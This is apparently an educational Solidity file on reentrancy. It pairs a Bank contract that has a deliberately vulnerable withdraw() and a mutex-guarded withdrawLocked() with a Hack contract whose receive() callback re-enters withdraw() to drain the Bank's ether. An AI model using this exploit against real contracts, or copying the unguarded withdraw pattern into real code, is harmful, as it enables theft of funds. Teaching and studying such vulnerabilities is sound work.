//SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract ReentrancyGuard {
   bool private locked;
// MUTEX pattern -> locks function execution and after all of the code in function completes unlocks it this prevents Reentrancy vuln in code
   modifier lock() {
    require(!locked, "Locked !");
    locked = true;
    _;
    locked = false;
   }
}

contract Bank is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Not protected function - vuln to Reentrancy
    function withdraw() external {
        uint256 bal = balanceOf[msg.sender];
        (bool success, ) = payable(msg.sender).call{value: bal}("");
        require(success, "Tx failed");
        balanceOf[msg.sender] = 0;
    }
    // Even this code is vuln to reentrancy but using modifier lock prevents reentrancy to happen
    function withdrawLocked() external lock {
        uint256 bal = balanceOf[msg.sender];
        (bool success, ) = payable(msg.sender).call{value: bal}("");
        require(success, "Tx failed");
        balanceOf[msg.sender] = 0;
    }
}

contract Hack {
    address immutable target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        Bank(target).deposit{value: 1e18}();
        Bank(target).withdraw();
    }

    receive() external payable {
        if(target.balance >= 1e18) {
            Bank(target).withdraw();
        }
    }
}